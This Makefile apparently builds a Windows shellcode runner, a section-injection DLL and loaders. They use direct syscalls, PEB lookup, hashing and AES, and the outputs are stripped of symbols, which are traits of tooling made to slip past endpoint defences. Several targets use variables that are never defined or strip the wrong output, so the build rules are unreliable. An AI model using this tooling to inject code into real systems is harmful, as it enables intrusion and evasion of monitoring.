CC=x86_64-w64-mingw32-gcc -Wl,--stack,4194304
ASM_CC=nasm -f win64
LIN_CC=gcc

LINK=-L./ -lgeneric_syscall
DLL_FLAGS=-O0 -shared -finline-functions
EXE_FLAGS=-O0 -finline-functions -static

ASM_SOURCE=generic_syscall.asm
LIB_OUT=generic_syscall.lib

COMMON_SOURCE=generic_syscalls.c peb_lookup.c sfh.c aes.c

SECTION_INJECTOR_DLL_SOURCE=section.c
SECTION_INJECTOR_DLL_OUT=section_inject.dll

SECTION_LOADER_SOURCE=section_loader.c
SECTION_LOADER_OUT=section_runner.exe
SECTION_LOADER_DLL_SOURCE=section_loader_DLL.c
SECTION_LOADER_DLL_OUT=section_runner.dll

SECTION_LOADER_BIG_SOURCE=section_loader_big.c
SECTION_LOADER_BIG_OUT=section_loader.exe
SECTION_LOADER_BIG_DLL_SOURCE=section_loader_big_DLL.c
SECTION_LOADER_BIG_DLL_OUT=section_loader.dll

RUNNER_SOURCE=run_shellcode.c
RUNNER_DLL_SOURCE=run_shellcode_DLL.c
RUNNER_BLOCKDLLS_SOURCE=runner_blockdlls.c
RUNNER_BLOCKDLLS_DLL_SOURCE=runner_blockdlls_DLL.c
RUNNER_OUT=runner.exe
RUNNER_DLL_OUT=runner.dll
RUNNER_BLOCKDLLS_OUT=runner_blockdlls.exe
RUNNER_BLOCKDLLS_DLL_OUT=runner_blockdlls.dll

HELPER_SOURCE=helper.c sfh.c aes.c
HELPER_WINDOWS_OUT=helper-win_x64.exe
HELPER_LINUX_OUT=helper_x64

S=strip
S_FLAGS=-s -R .comment -R .debug -R .gnu.version --strip-unneeded
DEBUG_FLAGS=-O0 -g -v


all: section_inject section_runner section_runner_dll runner runner_dll


section_inject:
		$(ASM_CC) $(ASM_SOURCE) -o $(LIB_OUT)
		$(CC) $(SECTION_INJECTOR_DLL_SOURCE) $(COMMON_SOURCE) -o $(SECTION_INJECTOR_DLL_OUT) $(LINK) $(DLL_FLAGS)
		$(S) $(S_FLAGS) $(SECTION_INJECTOR_DLL_OUT)

section_runner:
		$(ASM_CC) $(ASM_SOURCE) -o $(LIB_OUT)
		$(CC) $(SECTION_LOADER_SOURCE) $(COMMON_SOURCE) -o $(SECTION_LOADER_OUT) $(LINK) $(EXE_FLAGS)
		$(S) $(S_FLAGS) $(SECTION_LOADER_OUT)

section_runner_dll:
		$(ASM_CC) $(ASM_SOURCE) -o $(LIB_OUT)
		$(CC) $(SECTION_LOADER_DLL_SOURCE) $(COMMON_SOURCE) -o $(SECTION_LOADER_DLL_OUT) $(LINK) $(DLL_FLAGS)

section_runner_big:
		$(ASM_CC) $(ASM_SOURCE) -o $(LIB_OUT)
		$(CC) $(SECTION_LOADER_SOURCE) $(COMMON_SOURCE) -o $(SECTION_LOADER_OUT) $(LINK) $(EXE_FLAGS)
		$(S) $(S_FLAGS) $(SECTION_LOADER_OUT)

section_runner_big_dll:
		$(ASM_CC) $(ASM_SOURCE) -o $(LIB_OUT)
		$(CC) $(SECTION_LOADER_BIG_DLL_SOURCE) $(COMMON_SOURCE) -o $(SECTION_LOADER_BIG_DLL_OUT) $(LINK) $(DLL_FLAGS)
		$(S) $(S_FLAGS) $(SECTION_LOADER_OUT)

runner:
		$(ASM_CC) $(ASM_SOURCE) -o $(LIB_OUT)
		$(CC) $(RUNNER_SOURCE) $(COMMON_SOURCE) $(LINK) -o $(RUNNER_OUT) $(EXE_FLAGS)
		$(S) $(S_FLAGS) $(RUNNER_OUT)

runner_dll:
		$(ASM_CC) $(ASM_SOURCE) -o $(LIB_OUT)
		$(CC) $(RUNNER_DLL_SOURCE) $(COMMON_SOURCE) $(LINK) -o $(RUNNER_DLL_OUT) $(DLL_FLAGS)
		$(S) $(S_FLAGS) $(RUNNER_DLL_OUT)

runner_debug:
		$(ASM_CC) $(ASM_SOURCE) -o $(LIB_OUT)
		$(CC) $(RUNNER_SOURCE) $(COMMON_SOURCE) $(LINK) -o $(RUNNER_OUT) $(DEBUG_FLAGS)

runner_blockdlls:
		$(ASM_CC) $(ASM_SOURCE) -o $(LIB_OUT)
		$(CC) $(RUNNER_BLOCKDLLS_SOURCE) $(COMMON_SOURCE) $(LINK) -o $(RUNNER_BLOCKDLLS_OUT)
		$(S) $(S_FLAGS) $(RUNNER_BLOCKDLLS_OUT)

runner_blockdlls_dll:
		$(ASM_CC) $(ASM_SOURCE) -o $(LIB_OUT)
		$(CC) $(RUNNER_BLOCKDLLS_DLL_SOURCE) $(COMMON_SOURCE) $(LINK) -o $(RUNNER_BLOCKDLLS_DLL_OUT) $(DLL_FLAGS)
		$(S) $(S_FLAGS) $(RUNNER_BLOCKDLLS_OUT)

runner_blockdlls_debug:
		$(ASM_CC) $(ASM_SOURCE) -o $(LIB_OUT)
		$(CC) $(RUNNER_BLOCKDLLS_SOURCE) $(COMMON_SOURCE) $(LINK) -o $(RUNNER_BLOCKDLLS_OUT) $(DEBUG_FLAGS)

runner_big_blockdlls:
		$(ASM_CC) $(ASM_SOURCE) -o $(LIB_OUT)
		$(CC) $(RUNNER_BIG_SOURCE) $(COMMON_SOURCE) $(LINK) -o $(RUNNER_OUT) $(EXE_FLAGS)
		$(S) $(S_FLAGS) $(RUNNER_BIG_OUT)

runner_big_blockdlls_dll:
		$(ASM_CC) $(ASM_SOURCE) -o $(LIB_OUT)
		$(CC) $(RUNNER_BIG_DLL_SOURCE) $(COMMON_SOURCE) $(LINK) -o $(RUNNER_OUT) $(DLL_FLAGS)
		$(S) $(S_FLAGS) $(RUNNER_BIG_DLL_OUT)

helper_linux:
		$(LIN_CC) $(HELPER_SOURCE) -o $(HELPER_LINUX_OUT)
		$(S) $(S_FLAGS) $(HELPER_LINUX_OUT)

helper_windows:
		$(CC) $(HELPER_SOURCE) -o $(HELPER_OUT)

clean:
		-rm *.exe
		-rm *.dll
		-rm *.bin
		-rm *.lib